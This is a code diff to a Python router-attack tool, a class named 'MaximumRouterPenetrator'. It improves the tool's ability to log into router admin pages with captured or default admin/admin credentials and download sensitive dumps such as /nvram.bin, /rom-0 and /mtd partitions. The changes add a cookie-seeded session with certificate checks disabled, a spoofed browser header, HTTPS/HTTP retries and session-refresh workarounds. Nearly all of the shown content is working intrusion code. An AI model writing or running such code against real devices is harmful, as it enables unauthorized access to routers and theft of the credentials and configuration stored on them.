@@ -4418,10 +4418,31 @@ class MaximumRouterPenetrator:
                 '/nvram.bin', '/rom-0', '/mtd0', '/mtd1', '/mtd2'
             ]
             
-            base_url = f"http://{ip}"
+            base_url_http = f"http://{ip}"
+            base_url_https = f"https://{ip}"
             credentials = auth_result.get('credentials', ('admin', 'admin'))
+
+            # Build a persistent session (cookies, redirects, verify=False)
+            session = None
+            if REQUESTS_AVAILABLE:
+                try:
+                    session = requests.Session()
+                    session.auth = credentials
+                    session.verify = False
+                    session.headers.update({
+                        'User-Agent': 'Mozilla/5.0',
+                        'Accept': '*/*'
+                    })
+                    # Seed cookies by visiting admin pages
+                    for seed in [f"{base_url_http}/", f"{base_url_http}/admin/", f"{base_url_https}/", f"{base_url_https}/admin/"]:
+                        try:
+                            session.get(seed, timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
+                        except Exception:
+                            continue
+                except Exception:
+                    session = None
             
-            # Use urllib with Basic Auth for config file access
+            # Prepare Basic Auth for urllib fallback
             import base64
             auth_string = f'{credentials[0]}:{credentials[1]}'
             auth_bytes = auth_string.encode('ascii')
@@ -4429,12 +4450,44 @@ class MaximumRouterPenetrator:
             
             for config_path in config_paths:
                 try:
-                    req = urllib.request.Request(f"{base_url}{config_path}")
-                    req.add_header('Authorization', f'Basic {auth_b64}')
-                    
-                    response = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
-                    raw_content_bytes = response.read()
-                    content = raw_content_bytes.decode('utf-8', errors='ignore')
+                    raw_content_bytes = b''
+                    content = ''
+                    status_code = 0
+
+                    # Prefer requests session if available
+                    def fetch_with_session(base_url: str) -> Tuple[int, bytes, str]:
+                        if not session:
+                            return 0, b'', ''
+                        url = f"{base_url}{config_path}"
+                        headers = {'Referer': f"{base_url}/admin/"}
+                        r = session.get(url, headers=headers, timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
+                        return r.status_code, r.content, r.text
+
+                    # Try HTTPS then HTTP
+                    for base in (base_url_https, base_url_http):
+                        try:
+                            if session:
+                                status_code, raw_content_bytes, content = fetch_with_session(base)
+                            if not session or status_code == 0:
+                                # urllib fallback
+                                req = urllib.request.Request(f"{base}{config_path}")
+                                req.add_header('Authorization', f'Basic {auth_b64}')
+                                resp = urllib.request.urlopen(req, timeout=self.performance_config['timeouts']['connection'])
+                                raw_content_bytes = resp.read()
+                                content = raw_content_bytes.decode('utf-8', errors='ignore')
+                                status_code = getattr(resp, 'status', 200)
+                            # If content suggests invalid session, try to refresh cookies and retry once
+                            lc = content.lower()
+                            if ('invalid session key' in lc or 'window.location' in lc or '<meta http-equiv="refresh"' in lc) and session:
+                                try:
+                                    # Refresh session by hitting admin root and retry
+                                    session.get(f"{base}/admin/", timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
+                                    status_code, raw_content_bytes, content = fetch_with_session(base)
+                                except Exception:
+                                    pass
+                            break
+                        except Exception:
+                            continue
 
                     # Detect stubby HTML redirectors and retry via HTTPS with auth
                     is_html_stub = False
@@ -4444,22 +4497,19 @@ class MaximumRouterPenetrator:
                     if len(content) < 300 and '<html' in lc:
                         is_html_stub = True
 
-                    if is_html_stub and REQUESTS_AVAILABLE:
+                    if is_html_stub and REQUESTS_AVAILABLE and session:
                         try:
                             if verbose:
                                 print(f"         🔁 Stub HTML detected for {config_path}, retrying via HTTPS...")
-                            https_url = f"https://{ip}{config_path}"
-                            session = requests.Session()
-                            session.auth = credentials
-                            session.verify = False
-                            r = session.get(https_url, timeout=self.performance_config['timeouts']['connection'])
+                            https_url = f"{base_url_https}{config_path}"
+                            r = session.get(https_url, timeout=self.performance_config['timeouts']['connection'], allow_redirects=True)
                             if r.status_code == 200 and len(r.content) > 100:
                                 raw_content_bytes = r.content
                                 content = r.text
                         except Exception:
                             pass
                     
-                    if response.getcode() == 200 and len(content) > 100:
+                    if len(content) > 100 and (status_code == 200 or content):
                         # Derive stable filename per IP and path
                         safe_path = config_path.strip('/').replace('/', '__') or 'root'
                         safe_filename = f"config_{ip}__{safe_path}"
